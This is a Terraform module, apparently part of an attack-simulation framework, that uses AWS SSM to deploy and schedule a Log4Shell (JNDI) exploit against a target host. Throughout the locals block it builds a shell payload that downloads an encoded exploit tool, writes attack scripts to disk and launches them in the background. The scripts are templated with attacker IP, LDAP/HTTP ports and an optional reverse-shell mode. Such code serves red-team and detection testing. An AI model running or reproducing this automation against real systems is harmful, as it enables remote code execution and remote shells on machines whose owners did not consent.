locals {
    attack_dir = "/jndiexploit"
    attack_script = "jndiexploit.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_log4shell.lock"
    jndiexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jndiexploit"
    exec_type = var.reverse_shell == true ? "ReverseShell" : "Basic/Command/Base64"

    # only base64 encode the payload if we are executing a command
    base64_log4shell_payload= var.reverse_shell == true ? var.payload : base64encode(
       var.payload
    )
    payload = <<-EOT
    LOCKFILE="${ local.lock_file }"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "Checking for docker..."
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(which docker)"
    log "removing previous app directory"
    docker stop ${local.name}
    rm -rf ${local.attack_dir}
    log "creating app directory"
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.jdniexploit} | base64 -d > ${local.attack_script}
    echo ${local.delayed_start} | base64 -d > ${local.start_script}

    log "starting background delayed script start..."
    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
    log "background job started"
    log "done."
    EOT
    base64_payload      = base64encode(local.payload)
    jdniexploit              = base64encode(templatefile(
                                "${path.module}/resources/${local.attack_script}",
                                {
                                    jndiexploit_url     = local.jndiexploit_url
                                    image               = local.image
                                    name                = local.name
                                    attacker_ip         = var.attacker_ip
                                    attacker_http_port  = var.attacker_http_port
                                    attacker_ldap_port  = var.attacker_ldap_port
                                    target_ip           = var.target_ip
                                    target_port         = var.target_port
                                    exec_type           = local.exec_type
                                    base64_payload      = urlencode(local.base64_log4shell_payload)
                                    reverse_shell_port  = var.reverse_shell_port
                                }
                        ))
    delayed_start              = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    lock_file = local.lock_file
                                    attack_delay = var.attack_delay
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}